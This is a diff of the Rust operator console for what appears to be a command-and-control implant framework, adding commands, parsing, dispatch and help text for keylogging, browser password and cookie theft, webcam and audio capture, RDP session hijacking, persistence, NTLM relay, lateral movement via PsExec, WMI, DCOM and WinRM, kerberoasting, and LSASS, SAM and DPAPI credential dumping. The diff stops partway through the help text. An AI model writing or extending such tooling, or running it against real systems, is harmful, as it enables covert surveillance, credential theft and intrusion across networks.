@@ -16,6 +16,22 @@ pub mod socks;
 pub mod collab;
 pub mod operators;
 pub mod report;
+pub mod keylog;
+pub mod clipboard;
+pub mod env;
+pub mod browser;
+pub mod audio;
+pub mod webcam;
+pub mod usb;
+pub mod rdp;
+pub mod reg;
+pub mod svc;
+pub mod persist;
+pub mod scan;
+pub mod ntlm_relay;
+pub mod lateral;
+pub mod ad;
+pub mod creds;
 
 use anyhow::Result;
 use crate::cli::CliState;
@@ -78,6 +94,63 @@ pub enum Command {
     Screenshot,
     Wifi,
 
+    // Keylogger
+    Keylog(KeylogSubcommand),
+
+    // Clipboard
+    Clipboard(ClipboardSubcommand),
+
+    // Environment / system info
+    Env(EnvSubcommand),
+
+    // Browser data exfiltration
+    Browser(BrowserSubcommand),
+
+    // Audio capture
+    Audio { duration_secs: u32, format: Option<String> },
+
+    // Webcam capture
+    Webcam { device_index: Option<u32>, format: Option<String> },
+
+    // USB monitoring
+    Usb(UsbSubcommand),
+
+    // RDP hijack
+    Rdp(RdpSubcommand),
+
+    // Registry
+    Reg(RegSubcommand),
+
+    // Services
+    Svc(SvcSubcommand),
+
+    // Persistence
+    Persist(PersistSubcommand),
+
+    // Network scanning
+    Scan(ScanSubcommand),
+
+    // NTLM relay
+    NtlmRelay { listener_host: String, listener_port: u16, target_host: String, target_port: u16, protocol: Option<String> },
+
+    // Lateral movement
+    Lateral(LateralSubcommand),
+
+    // Active Directory
+    Ad(AdSubcommand),
+
+    // Credentials
+    Creds(CredsSubcommand),
+
+    // Screenshot stream
+    ScreenshotStream { interval_ms: u32, quality: Option<u32>, max_frames: Option<u32> },
+
+    // Token (extended)
+    TokenMake { username: String, password: String, domain: Option<String> },
+    TokenImpersonate(u32),
+    TokenEnablePriv(String),
+    TokenList,
+
     // Mesh
     Mesh(MeshSubcommand),
 
@@ -107,6 +180,112 @@ pub enum Command {
 pub enum ConfigSubcommand {
     Interval(u32),
     Jitter(u32),
+}
+
+#[derive(Debug, Clone)]
+pub enum KeylogSubcommand {
+    Start,
+    Stop,
+    Dump,
+}
+
+#[derive(Debug, Clone)]
+pub enum ClipboardSubcommand {
+    Get,
+    Set(String),
+    Monitor,
+    Stop,
+    Dump,
+}
+
+#[derive(Debug, Clone)]
+pub enum EnvSubcommand {
+    Sysinfo,
+    Netinfo,
+    Envvars,
+    Whoami,
+}
+
+#[derive(Debug, Clone)]
+pub enum BrowserSubcommand {
+    Passwords,
+    Cookies,
+    History,
+    All,
+}
+
+#[derive(Debug, Clone)]
+pub enum UsbSubcommand {
+    Start,
+    Stop,
+    List,
+}
+
+#[derive(Debug, Clone)]
+pub enum RdpSubcommand {
+    Hijack(u32),
+}
+
+#[derive(Debug, Clone)]
+pub enum RegSubcommand {
+    Query(String),
+    Set { path: String, name: String, reg_type: String, data: String },
+    Delete { path: String, name: String },
+    EnumKeys(String),
+    EnumValues(String),
+}
+
+#[derive(Debug, Clone)]
+pub enum SvcSubcommand {
+    List,
+    Query(String),
+    Create { name: String, binary_path: String },
+    Delete(String),
+    Start(String),
+    Stop(String),
+    Modify { name: String, field: String, value: String },
+}
+
+#[derive(Debug, Clone)]
+pub enum PersistSubcommand {
+    Install { method: String, name: String, payload_path: String, trigger: Option<String> },
+    Remove(String),
+    List,
+}
+
+#[derive(Debug, Clone)]
+pub enum ScanSubcommand {
+    Ports { target: String, ports: String, threads: Option<u32>, timeout_ms: Option<u32> },
+    Ping { subnet: String, timeout_ms: Option<u32> },
+    Shares(String),
+}
+
+#[derive(Debug, Clone)]
+pub enum LateralSubcommand {
+    Psexec { target: String, command: String },
+    Wmi { target: String, command: String },
+    Dcom { target: String, command: String },
+    Winrm { target: String, command: String },
+    Schtask { target: String, task_name: String, command: String },
+}
+
+#[derive(Debug, Clone)]
+pub enum AdSubcommand {
+    Users(Option<String>),
+    Groups(Option<String>),
+    Computers(Option<String>),
+    Kerberoast,
+    Asreproast,
+    Query { filter: String, attributes: Vec<String> },
+}
+
+#[derive(Debug, Clone)]
+pub enum CredsSubcommand {
+    Sam,
+    Lsass(Option<String>),
+    Secrets,
+    Dpapi(Option<String>),
+    Vault,
 }
 
 #[derive(Debug, Clone)]
@@ -419,7 +598,8 @@ pub fn parse(input: &str) -> Command {
                 Command::Unknown("sleep requires seconds".to_string())
             } else {
                 match args[0].parse::<u32>() {
-                    Ok(s) => Command::Sleep(s),
+                    Ok(s) if s >= 1 && s <= 86400 => Command::Sleep(s),
+                    Ok(_) => Command::Unknown("Sleep interval must be between 1 and 86400 seconds".to_string()),
                     Err(_) => Command::Unknown("sleep requires a number".to_string()),
                 }
             }
@@ -427,6 +607,267 @@ pub fn parse(input: &str) -> Command {
         "burn" => Command::Burn,
         "screenshot" => Command::Screenshot,
         "wifi" => Command::Wifi,
+
+        // Keylogger
+        "keylog" => {
+            match args.first().map(|s| s.as_str()) {
+                Some("start") => Command::Keylog(KeylogSubcommand::Start),
+                Some("stop") => Command::Keylog(KeylogSubcommand::Stop),
+                Some("dump") => Command::Keylog(KeylogSubcommand::Dump),
+                _ => Command::Unknown("Usage: keylog <start|stop|dump>".to_string()),
+            }
+        }
+
+        // Clipboard
+        "clipboard" => {
+            match args.first().map(|s| s.as_str()) {
+                Some("get") => Command::Clipboard(ClipboardSubcommand::Get),
+                Some("set") => {
+                    if args.len() < 2 {
+                        Command::Unknown("Usage: clipboard set <text>".to_string())
+                    } else {
+                        Command::Clipboard(ClipboardSubcommand::Set(args[1..].join(" ")))
+                    }
+                }
+                Some("monitor") => Command::Clipboard(ClipboardSubcommand::Monitor),
+                Some("stop") => Command::Clipboard(ClipboardSubcommand::Stop),
+                Some("dump") => Command::Clipboard(ClipboardSubcommand::Dump),
+                _ => Command::Unknown("Usage: clipboard <get|set|monitor|stop|dump>".to_string()),
+            }
+        }
+
+        // Environment
+        "env" => {
+            match args.first().map(|s| s.as_str()) {
+                Some("sysinfo") => Command::Env(EnvSubcommand::Sysinfo),
+                Some("netinfo") => Command::Env(EnvSubcommand::Netinfo),
+                Some("vars") | Some("envvars") => Command::Env(EnvSubcommand::Envvars),
+                Some("whoami") => Command::Env(EnvSubcommand::Whoami),
+                _ => Command::Unknown("Usage: env <sysinfo|netinfo|vars|whoami>".to_string()),
+            }
+        }
+
+        // Browser
+        "browser" => {
+            match args.first().map(|s| s.as_str()) {
+                Some("passwords") => Command::Browser(BrowserSubcommand::Passwords),
+                Some("cookies") => Command::Browser(BrowserSubcommand::Cookies),
+                Some("history") => Command::Browser(BrowserSubcommand::History),
+                Some("all") => Command::Browser(BrowserSubcommand::All),
+                _ => Command::Unknown("Usage: browser <passwords|cookies|history|all>".to_string()),
+            }
+        }
+
+        // Audio
+        "audio" => {
+            if args.is_empty() {
+                Command::Unknown("Usage: audio <duration_secs> [format]".to_string())
+            } else {
+                match args[0].parse::<u32>() {
+                    Ok(d) => Command::Audio { duration_secs: d, format: args.get(1).cloned() },
+                    Err(_) => Command::Unknown("audio: duration must be a number".to_string()),
+                }
+            }
+        }
+
+        // Webcam
+        "webcam" => {
+            let device_index = args.first().and_then(|s| s.parse::<u32>().ok());
+            let format = if device_index.is_some() { args.get(1).cloned() } else { args.first().cloned() };
+            Command::Webcam { device_index, format }
+        }
+
+        // USB
+        "usb" => {
+            match args.first().map(|s| s.as_str()) {
+                Some("start") => Command::Usb(UsbSubcommand::Start),
+                Some("stop") => Command::Usb(UsbSubcommand::Stop),
+                Some("list") => Command::Usb(UsbSubcommand::List),
+                _ => Command::Unknown("Usage: usb <start|stop|list>".to_string()),
+            }
+        }
+
+        // RDP
+        "rdp" => {
+            match args.first().map(|s| s.as_str()) {
+                Some("hijack") => {
+                    if args.len() < 2 {
+                        Command::Unknown("Usage: rdp hijack <session_id>".to_string())
+                    } else {
+                        match args[1].parse::<u32>() {
+                            Ok(id) => Command::Rdp(RdpSubcommand::Hijack(id)),
+                            Err(_) => Command::Unknown("rdp: session_id must be a number".to_string()),
+                        }
+                    }
+                }
+                _ => Command::Unknown("Usage: rdp hijack <session_id>".to_string()),
+            }
+        }
+
+        // Registry
+        "reg" => {
+            match args.first().map(|s| s.as_str()) {
+                Some("query") if args.len() >= 2 => Command::Reg(RegSubcommand::Query(args[1].clone())),
+                Some("set") if args.len() >= 5 => Command::Reg(RegSubcommand::Set {
+                    path: args[1].clone(), name: args[2].clone(),
+                    reg_type: args[3].clone(), data: args[4..].join(" "),
+                }),
+                Some("delete") if args.len() >= 3 => Command::Reg(RegSubcommand::Delete {
+                    path: args[1].clone(), name: args[2].clone(),
+                }),
+                Some("enum-keys") if args.len() >= 2 => Command::Reg(RegSubcommand::EnumKeys(args[1].clone())),
+                Some("enum-values") if args.len() >= 2 => Command::Reg(RegSubcommand::EnumValues(args[1].clone())),
+                _ => Command::Unknown("Usage: reg <query|set|delete|enum-keys|enum-values> <path> [args...]".to_string()),
+            }
+        }
+
+        // Services
+        "svc" => {
+            match args.first().map(|s| s.as_str()) {
+                Some("list") | None => Command::Svc(SvcSubcommand::List),
+                Some("query") if args.len() >= 2 => Command::Svc(SvcSubcommand::Query(args[1].clone())),
+                Some("create") if args.len() >= 3 => Command::Svc(SvcSubcommand::Create {
+                    name: args[1].clone(), binary_path: args[2].clone(),
+                }),
+                Some("delete") if args.len() >= 2 => Command::Svc(SvcSubcommand::Delete(args[1].clone())),
+                Some("start") if args.len() >= 2 => Command::Svc(SvcSubcommand::Start(args[1].clone())),
+                Some("stop") if args.len() >= 2 => Command::Svc(SvcSubcommand::Stop(args[1].clone())),
+                Some("modify") if args.len() >= 4 => Command::Svc(SvcSubcommand::Modify {
+                    name: args[1].clone(), field: args[2].clone(), value: args[3..].join(" "),
+                }),
+                _ => Command::Unknown("Usage: svc <list|query|create|delete|start|stop|modify> [args...]".to_string()),
+            }
+        }
+
+        // Persistence
+        "persist" => {
+            match args.first().map(|s| s.as_str()) {
+                Some("install") if args.len() >= 4 => Command::Persist(PersistSubcommand::Install {
+                    method: args[1].clone(), name: args[2].clone(),
+                    payload_path: args[3].clone(), trigger: args.get(4).cloned(),
+                }),
+                Some("remove") if args.len() >= 2 => Command::Persist(PersistSubcommand::Remove(args[1].clone())),
+                Some("list") | None => Command::Persist(PersistSubcommand::List),
+                _ => Command::Unknown("Usage: persist <install|remove|list> [args...]".to_string()),
+            }
+        }
+
+        // Network scanning
+        "scan" => {
+            match args.first().map(|s| s.as_str()) {
+                Some("ports") if args.len() >= 3 => Command::Scan(ScanSubcommand::Ports {
+                    target: args[1].clone(), ports: args[2].clone(),
+                    threads: args.get(3).and_then(|s| s.parse().ok()),
+                    timeout_ms: args.get(4).and_then(|s| s.parse().ok()),
+                }),
+                Some("ping") if args.len() >= 2 => Command::Scan(ScanSubcommand::Ping {
+                    subnet: args[1].clone(),
+                    timeout_ms: args.get(2).and_then(|s| s.parse().ok()),
+                }),
+                Some("shares") if args.len() >= 2 => Command::Scan(ScanSubcommand::Shares(args[1].clone())),
+                _ => Command::Unknown("Usage: scan <ports|ping|shares> <target> [args...]".to_string()),
+            }
+        }
+
+        // NTLM relay
+        "ntlm-relay" => {
+            if args.len() < 4 {
+                Command::Unknown("Usage: ntlm-relay <listener_host> <listener_port> <target_host> <target_port> [protocol]".to_string())
+            } else {
+                match (args[1].parse::<u16>(), args[3].parse::<u16>()) {
+                    (Ok(lp), Ok(tp)) => Command::NtlmRelay {
+                        listener_host: args[0].clone(), listener_port: lp,
+                        target_host: args[2].clone(), target_port: tp,
+                        protocol: args.get(4).cloned(),
+                    },
+                    _ => Command::Unknown("ntlm-relay: ports must be numbers".to_string()),
+                }
+            }
+        }
+
+        // Lateral movement
+        "lateral" => {
+            match args.first().map(|s| s.as_str()) {
+                Some("psexec") if args.len() >= 3 => Command::Lateral(LateralSubcommand::Psexec {
+                    target: args[1].clone(), command: args[2..].join(" "),
+                }),
+                Some("wmi") if args.len() >= 3 => Command::Lateral(LateralSubcommand::Wmi {
+                    target: args[1].clone(), command: args[2..].join(" "),
+                }),
+                Some("dcom") if args.len() >= 3 => Command::Lateral(LateralSubcommand::Dcom {
+                    target: args[1].clone(), command: args[2..].join(" "),
+                }),
+                Some("winrm") if args.len() >= 3 => Command::Lateral(LateralSubcommand::Winrm {
+                    target: args[1].clone(), command: args[2..].join(" "),
+                }),
+                Some("schtask") if args.len() >= 4 => Command::Lateral(LateralSubcommand::Schtask {
+                    target: args[1].clone(), task_name: args[2].clone(), command: args[3..].join(" "),
+                }),
+                _ => Command::Unknown("Usage: lateral <psexec|wmi|dcom|winrm|schtask> <target> [args...]".to_string()),
+            }
+        }
+
+        // Active Directory
+        "ad" => {
+            match args.first().map(|s| s.as_str()) {
+                Some("users") => Command::Ad(AdSubcommand::Users(args.get(1).cloned())),
+                Some("groups") => Command::Ad(AdSubcommand::Groups(args.get(1).cloned())),
+                Some("computers") => Command::Ad(AdSubcommand::Computers(args.get(1).cloned())),
+                Some("kerberoast") => Command::Ad(AdSubcommand::Kerberoast),
+                Some("asreproast") => Command::Ad(AdSubcommand::Asreproast),
+                Some("query") if args.len() >= 2 => Command::Ad(AdSubcommand::Query {
+                    filter: args[1].clone(), attributes: args[2..].to_vec(),
+                }),
+                _ => Command::Unknown("Usage: ad <users|groups|computers|kerberoast|asreproast|query> [args...]".to_string()),
+            }
+        }
+
+        // Credentials
+        "creds" => {
+            match args.first().map(|s| s.as_str()) {
+                Some("sam") => Command::Creds(CredsSubcommand::Sam),
+                Some("lsass") => Command::Creds(CredsSubcommand::Lsass(args.get(1).cloned())),
+                Some("secrets") => Command::Creds(CredsSubcommand::Secrets),
+                Some("dpapi") => Command::Creds(CredsSubcommand::Dpapi(args.get(1).cloned())),
+                Some("vault") => Command::Creds(CredsSubcommand::Vault),
+                _ => Command::Unknown("Usage: creds <sam|lsass|secrets|dpapi|vault> [args...]".to_string()),
+            }
+        }
+
+        // Screenshot stream
+        "screenshot-stream" => {
+            if args.is_empty() {
+                Command::Unknown("Usage: screenshot-stream <interval_ms> [quality] [max_frames]".to_string())
+            } else {
+                match args[0].parse::<u32>() {
+                    Ok(interval) => Command::ScreenshotStream {
+                        interval_ms: interval,
+                        quality: args.get(1).and_then(|s| s.parse().ok()),
+                        max_frames: args.get(2).and_then(|s| s.parse().ok()),
+                    },
+                    Err(_) => Command::Unknown("screenshot-stream: interval must be a number".to_string()),
+                }
+            }
+        }
+
+        // Token extended
+        "token" => {
+            match args.first().map(|s| s.as_str()) {
+                Some("make") if args.len() >= 3 => Command::TokenMake {
+                    username: args[1].clone(), password: args[2].clone(),
+                    domain: args.get(3).cloned(),
+                },
+                Some("impersonate") if args.len() >= 2 => {
+                    match args[1].parse::<u32>() {
+                        Ok(id) => Command::TokenImpersonate(id),
+                        Err(_) => Command::Unknown("token impersonate: token_id must be a number".to_string()),
+                    }
+                }
+                Some("enable-priv") if args.len() >= 2 => Command::TokenEnablePriv(args[1].clone()),
+                Some("list") | None => Command::TokenList,
+                _ => Command::Unknown("Usage: token <make|impersonate|enable-priv|list|steal|rev2self> [args...]".to_string()),
+            }
+        }
 
         // Payload
         "payload" => {
@@ -1241,7 +1682,7 @@ pub async fn dispatch(cmd: Command, cli: &mut CliState) -> Result<bool> {
                 print_error("No session selected. Use 'use <id>' first.");
                 return Ok(false);
             }
-            interact::cd(cli, &path).await?;
+            interact::cd(cli, &path)?;
             Ok(false)
         }
         Command::Pwd => {
@@ -1265,7 +1706,7 @@ pub async fn dispatch(cmd: Command, cli: &mut CliState) -> Result<bool> {
                 print_error("No session selected. Use 'use <id>' first.");
                 return Ok(false);
             }
-            interact::pushd(cli, &path).await?;
+            interact::pushd(cli, &path)?;
             Ok(false)
         }
         Command::Popd => {
@@ -1273,7 +1714,7 @@ pub async fn dispatch(cmd: Command, cli: &mut CliState) -> Result<bool> {
                 print_error("No session selected. Use 'use <id>' first.");
                 return Ok(false);
             }
-            interact::popd(cli).await?;
+            interact::popd(cli)?;
             Ok(false)
         }
         Command::Dirs => {
@@ -1330,6 +1771,270 @@ pub async fn dispatch(cmd: Command, cli: &mut CliState) -> Result<bool> {
                 return Ok(false);
             }
             interact::wifi(cli).await?;
+            Ok(false)
+        }
+
+        Command::Keylog(subcmd) => {
+            if cli.active_session().is_none() {
+                print_error("No session selected. Use 'use <id>' first.");
+                return Ok(false);
+            }
+            match subcmd {
+                KeylogSubcommand::Start => keylog::start(cli).await?,
+                KeylogSubcommand::Stop => keylog::stop(cli).await?,
+                KeylogSubcommand::Dump => keylog::dump(cli).await?,
+            }
+            Ok(false)
+        }
+
+        Command::Clipboard(subcmd) => {
+            if cli.active_session().is_none() {
+                print_error("No session selected. Use 'use <id>' first.");
+                return Ok(false);
+            }
+            match subcmd {
+                ClipboardSubcommand::Get => clipboard::get(cli).await?,
+                ClipboardSubcommand::Set(text) => clipboard::set(cli, &text).await?,
+                ClipboardSubcommand::Monitor => clipboard::monitor(cli).await?,
+                ClipboardSubcommand::Stop => clipboard::stop(cli).await?,
+                ClipboardSubcommand::Dump => clipboard::dump(cli).await?,
+            }
+            Ok(false)
+        }
+
+        Command::Env(subcmd) => {
+            if cli.active_session().is_none() {
+                print_error("No session selected. Use 'use <id>' first.");
+                return Ok(false);
+            }
+            match subcmd {
+                EnvSubcommand::Sysinfo => env::sysinfo(cli).await?,
+                EnvSubcommand::Netinfo => env::netinfo(cli).await?,
+                EnvSubcommand::Envvars => env::envvars(cli).await?,
+                EnvSubcommand::Whoami => env::whoami(cli).await?,
+            }
+            Ok(false)
+        }
+
+        Command::Browser(subcmd) => {
+            if cli.active_session().is_none() {
+                print_error("No session selected. Use 'use <id>' first.");
+                return Ok(false);
+            }
+            match subcmd {
+                BrowserSubcommand::Passwords => browser::passwords(cli).await?,
+                BrowserSubcommand::Cookies => browser::cookies(cli).await?,
+                BrowserSubcommand::History => browser::history(cli).await?,
+                BrowserSubcommand::All => browser::all(cli).await?,
+            }
+            Ok(false)
+        }
+
+        Command::Audio { duration_secs, format } => {
+            if cli.active_session().is_none() {
+                print_error("No session selected. Use 'use <id>' first.");
+                return Ok(false);
+            }
+            audio::capture(cli, duration_secs, format).await?;
+            Ok(false)
+        }
+
+        Command::Webcam { device_index, format } => {
+            if cli.active_session().is_none() {
+                print_error("No session selected. Use 'use <id>' first.");
+                return Ok(false);
+            }
+            webcam::capture(cli, device_index, format).await?;
+            Ok(false)
+        }
+
+        Command::Usb(subcmd) => {
+            if cli.active_session().is_none() {
+                print_error("No session selected. Use 'use <id>' first.");
+                return Ok(false);
+            }
+            match subcmd {
+                UsbSubcommand::Start => usb::start(cli).await?,
+                UsbSubcommand::Stop => usb::stop(cli).await?,
+                UsbSubcommand::List => usb::list(cli).await?,
+            }
+            Ok(false)
+        }
+
+        Command::Rdp(subcmd) => {
+            if cli.active_session().is_none() {
+                print_error("No session selected. Use 'use <id>' first.");
+                return Ok(false);
+            }
+            match subcmd {
+                RdpSubcommand::Hijack(id) => rdp::hijack(cli, id).await?,
+            }
+            Ok(false)
+        }
+
+        Command::Reg(subcmd) => {
+            if cli.active_session().is_none() {
+                print_error("No session selected. Use 'use <id>' first.");
+                return Ok(false);
+            }
+            match subcmd {
+                RegSubcommand::Query(path) => reg::query(cli, &path).await?,
+                RegSubcommand::Set { path, name, reg_type, data } => reg::set(cli, &path, &name, &reg_type, &data).await?,
+                RegSubcommand::Delete { path, name } => reg::delete(cli, &path, &name).await?,
+                RegSubcommand::EnumKeys(path) => reg::enum_keys(cli, &path).await?,
+                RegSubcommand::EnumValues(path) => reg::enum_values(cli, &path).await?,
+            }
+            Ok(false)
+        }
+
+        Command::Svc(subcmd) => {
+            if cli.active_session().is_none() {
+                print_error("No session selected. Use 'use <id>' first.");
+                return Ok(false);
+            }
+            match subcmd {
+                SvcSubcommand::List => svc::list(cli).await?,
+                SvcSubcommand::Query(name) => svc::query(cli, &name).await?,
+                SvcSubcommand::Create { name, binary_path } => svc::create(cli, &name, &binary_path).await?,
+                SvcSubcommand::Delete(name) => svc::delete(cli, &name).await?,
+                SvcSubcommand::Start(name) => svc::start(cli, &name).await?,
+                SvcSubcommand::Stop(name) => svc::stop(cli, &name).await?,
+                SvcSubcommand::Modify { name, field, value } => svc::modify(cli, &name, &field, &value).await?,
+            }
+            Ok(false)
+        }
+
+        Command::Persist(subcmd) => {
+            if cli.active_session().is_none() {
+                print_error("No session selected. Use 'use <id>' first.");
+                return Ok(false);
+            }
+            match subcmd {
+                PersistSubcommand::Install { method, name, payload_path, trigger } => {
+                    persist::install(cli, &method, &name, &payload_path, trigger.as_deref()).await?
+                }
+                PersistSubcommand::Remove(name) => persist::remove(cli, &name).await?,
+                PersistSubcommand::List => persist::list(cli).await?,
+            }
+            Ok(false)
+        }
+
+        Command::Scan(subcmd) => {
+            if cli.active_session().is_none() {
+                print_error("No session selected. Use 'use <id>' first.");
+                return Ok(false);
+            }
+            match subcmd {
+                ScanSubcommand::Ports { target, ports, threads, timeout_ms } => {
+                    scan::ports(cli, &target, &ports, threads, timeout_ms).await?
+                }
+                ScanSubcommand::Ping { subnet, timeout_ms } => scan::ping(cli, &subnet, timeout_ms).await?,
+                ScanSubcommand::Shares(target) => scan::shares(cli, &target).await?,
+            }
+            Ok(false)
+        }
+
+        Command::NtlmRelay { listener_host, listener_port, target_host, target_port, protocol } => {
+            if cli.active_session().is_none() {
+                print_error("No session selected. Use 'use <id>' first.");
+                return Ok(false);
+            }
+            let lp = listener_port.to_string();
+            let tp = target_port.to_string();
+            ntlm_relay::setup(cli, &listener_host, &lp, &target_host, &tp, protocol).await?;
+            Ok(false)
+        }
+
+        Command::Lateral(subcmd) => {
+            if cli.active_session().is_none() {
+                print_error("No session selected. Use 'use <id>' first.");
+                return Ok(false);
+            }
+            match subcmd {
+                LateralSubcommand::Psexec { target, command } => lateral::psexec(cli, &target, &command).await?,
+                LateralSubcommand::Wmi { target, command } => lateral::wmi(cli, &target, &command).await?,
+                LateralSubcommand::Dcom { target, command } => lateral::dcom(cli, &target, &command).await?,
+                LateralSubcommand::Winrm { target, command } => lateral::winrm(cli, &target, &command).await?,
+                LateralSubcommand::Schtask { target, task_name, command } => {
+                    lateral::schtask(cli, &target, &task_name, &command).await?
+                }
+            }
+            Ok(false)
+        }
+
+        Command::Ad(subcmd) => {
+            if cli.active_session().is_none() {
+                print_error("No session selected. Use 'use <id>' first.");
+                return Ok(false);
+            }
+            match subcmd {
+                AdSubcommand::Users(filter) => ad::users(cli, filter.as_deref()).await?,
+                AdSubcommand::Groups(filter) => ad::groups(cli, filter.as_deref()).await?,
+                AdSubcommand::Computers(filter) => ad::computers(cli, filter.as_deref()).await?,
+                AdSubcommand::Kerberoast => ad::kerberoast(cli).await?,
+                AdSubcommand::Asreproast => ad::asreproast(cli).await?,
+                AdSubcommand::Query { filter, attributes } => ad::query(cli, &filter, &attributes).await?,
+            }
+            Ok(false)
+        }
+
+        Command::Creds(subcmd) => {
+            if cli.active_session().is_none() {
+                print_error("No session selected. Use 'use <id>' first.");
+                return Ok(false);
+            }
+            match subcmd {
+                CredsSubcommand::Sam => creds::sam(cli).await?,
+                CredsSubcommand::Lsass(method) => creds::lsass(cli, method.as_deref()).await?,
+                CredsSubcommand::Secrets => creds::secrets(cli).await?,
+                CredsSubcommand::Dpapi(target) => creds::dpapi(cli, target.as_deref()).await?,
+                CredsSubcommand::Vault => creds::vault(cli).await?,
+            }
+            Ok(false)
+        }
+
+        Command::ScreenshotStream { interval_ms, quality, max_frames } => {
+            if cli.active_session().is_none() {
+                print_error("No session selected. Use 'use <id>' first.");
+                return Ok(false);
+            }
+            interact::screenshot_stream(cli, interval_ms, quality, max_frames).await?;
+            Ok(false)
+        }
+
+        Command::TokenMake { username, password, domain } => {
+            if cli.active_session().is_none() {
+                print_error("No session selected. Use 'use <id>' first.");
+                return Ok(false);
+            }
+            interact::token_make(cli, &username, &password, domain.as_deref()).await?;
+            Ok(false)
+        }
+
+        Command::TokenImpersonate(id) => {
+            if cli.active_session().is_none() {
+                print_error("No session selected. Use 'use <id>' first.");
+                return Ok(false);
+            }
+            interact::token_impersonate(cli, id).await?;
+            Ok(false)
+        }
+
+        Command::TokenEnablePriv(priv_name) => {
+            if cli.active_session().is_none() {
+                print_error("No session selected. Use 'use <id>' first.");
+                return Ok(false);
+            }
+            interact::token_enable_priv(cli, &priv_name).await?;
+            Ok(false)
+        }
+
+        Command::TokenList => {
+            if cli.active_session().is_none() {
+                print_error("No session selected. Use 'use <id>' first.");
+                return Ok(false);
+            }
+            interact::token_list(cli).await?;
             Ok(false)
         }
 
@@ -1756,7 +2461,39 @@ fn print_help() {
         println!("  {}              List all reports", style("report list").fg(crate::theme::colors::TEAL));
         println!("  {} {} {} {}  Generate report", style("report generate").fg(crate::theme::colors::TEAL), style("<title>").fg(crate::theme::colors::PEACH), style("<type>").fg(crate::theme::colors::PEACH), style("<fmt>").fg(crate::theme::colors::PEACH));
         println!("  {} {}          Show report details", style("report show").fg(crate::theme::colors::TEAL), style("<id>").fg(crate::theme::colors::PEACH));
-        println!("  {} {}        Delete report\n", style("report delete").fg(crate::theme::colors::TEAL), style("<id>").fg(crate::theme::colors::PEACH));
+        println!("  {} {}        Delete report", style("report delete").fg(crate::theme::colors::TEAL), style("<id>").fg(crate::theme::colors::PEACH));
+
+        println!("\n{}", style("COLLECTION").fg(crate::theme::colors::LAVENDER).bold());
+        println!("  {} {}  Keylogger control", style("keylog").fg(crate::theme::colors::TEAL), style("<start|stop|dump>").fg(crate::theme::colors::PEACH));
+        println!("  {} {}  Clipboard operations", style("clipboard").fg(crate::theme::colors::TEAL), style("<get|set|monitor|stop|dump>").fg(crate::theme::colors::PEACH));
+        println!("  {}                        Take screenshot", style("screenshot").fg(crate::theme::colors::TEAL));
+        println!("  {} {} {} {}  Continuous screenshots", style("screenshot-stream").fg(crate::theme::colors::TEAL), style("<ms>").fg(crate::theme::colors::PEACH), style("[quality]").fg(crate::theme::colors::PEACH), style("[max]").fg(crate::theme::colors::PEACH));
+        println!("  {} {}  Audio capture", style("audio").fg(crate::theme::colors::TEAL), style("<duration> [format]").fg(crate::theme::colors::PEACH));
+        println!("  {} {}  Webcam capture", style("webcam").fg(crate::theme::colors::TEAL), style("[device] [format]").fg(crate::theme::colors::PEACH));
+        println!("  {} {}  USB device monitoring", style("usb").fg(crate::theme::colors::TEAL), style("<start|stop|list>").fg(crate::theme::colors::PEACH));
+
+        println!("\n{}", style("RECONNAISSANCE").fg(crate::theme::colors::LAVENDER).bold());
+        println!("  {} {}  System information", style("env").fg(crate::theme::colors::TEAL), style("<sysinfo|netinfo|vars|whoami>").fg(crate::theme::colors::PEACH));
+        println!("  {} {} {}  Port scan", style("scan ports").fg(crate::theme::colors::TEAL), style("<target> <ports>").fg(crate::theme::colors::PEACH), style("[threads]").fg(crate::theme::colors::PEACH));
+        println!("  {} {} {}  Ping sweep", style("scan ping").fg(crate::theme::colors::TEAL), style("<subnet>").fg(crate::theme::colors::PEACH), style("[timeout]").fg(crate::theme::colors::PEACH));
+        println!("  {} {}  Share enumeration", style("scan shares").fg(crate::theme::colors::TEAL), style("<target>").fg(crate::theme::colors::PEACH));
+        println!("  {} {} {}  Registry operations", style("reg").fg(crate::theme::colors::TEAL), style("<query|set|delete|enum-keys|enum-values>").fg(crate::theme::colors::PEACH), style("<path>").fg(crate::theme::colors::PEACH));
+        println!("  {} {}  Service management", style("svc").fg(crate::theme::colors::TEAL), style("<list|query|create|delete|start|stop|modify>").fg(crate::theme::colors::PEACH));
+        println!("  {} {}  AD enumeration", style("ad").fg(crate::theme::colors::TEAL), style("<users|groups|computers|kerberoast|asreproast|query>").fg(crate::theme::colors::PEACH));
+
+        println!("\n{}", style("CREDENTIAL HARVESTING").fg(crate::theme::colors::LAVENDER).bold());
+        println!("  {} {}  Credential dumping", style("creds").fg(crate::theme::colors::TEAL), style("<sam|lsass|secrets|dpapi|vault>").fg(crate::theme::colors::PEACH));
+        println!("  {} {}  Browser data extraction", style("browser").fg(crate::theme::colors::TEAL), style("<passwords|cookies|history|all>").fg(crate::theme::colors::PEACH));
+        println!("  {} {} {}  Create token", style("token make").fg(crate::theme::colors::TEAL), style("<user> <pass>").fg(crate::theme::colors::PEACH), style("[domain]").fg(crate::theme::colors::PEACH));
+        println!("  {} {}  Impersonate token", style("token impersonate").fg(crate::theme::colors::TEAL), style("<id>").fg(crate::theme::colors::PEACH));
+        println!("  {} {}  Enable privilege", style("token enable-priv").fg(crate::theme::colors::TEAL), style("<privilege>").fg(crate::theme::colors::PEACH));
+
+        println!("\n{}", style("LATERAL MOVEMENT").fg(crate::theme::colors::LAVENDER).bold());
+        println!("  {} {} {}  Lateral movement", style("lateral").fg(crate::theme::colors::TEAL), style("<psexec|wmi|dcom|winrm|schtask> <target>").fg(crate::theme::colors::PEACH), style("<cmd>").fg(crate::theme::colors::PEACH));
+        println!("  {} {}  Persistence management", style("persist").fg(crate::theme::colors::TEAL), style("<install|remove|list>").fg(crate::theme::colors::PEACH));
+        println!("  {} {}  RDP session hijack", style("rdp hijack").fg(crate::theme::colors::TEAL), style("<session_id>").fg(crate::theme::colors::PEACH));
+        println!("  {} {}  NTLM relay", style("ntlm-relay").fg(crate::theme::colors::TEAL), style("<lhost> <lport> <thost> <tport>").fg(crate::theme::colors::PEACH));
+
     } else {
         println!("\nGLOBAL COMMANDS");
         println!("  sessions              List all sessions");
@@ -1877,6 +2614,37 @@ fn print_help() {
         println!("  report list           List all reports");
         println!("  report generate <title> <type> <fmt>  Generate report");
         println!("  report show <id>      Show report details");
-        println!("  report delete <id>    Delete report\n");
+        println!("  report delete <id>    Delete report");
+
+        println!("\nCOLLECTION");
+        println!("  keylog <start|stop|dump>                    Keylogger control");
+        println!("  clipboard <get|set|monitor|stop|dump>       Clipboard operations");
+        println!("  screenshot                                   Take screenshot");
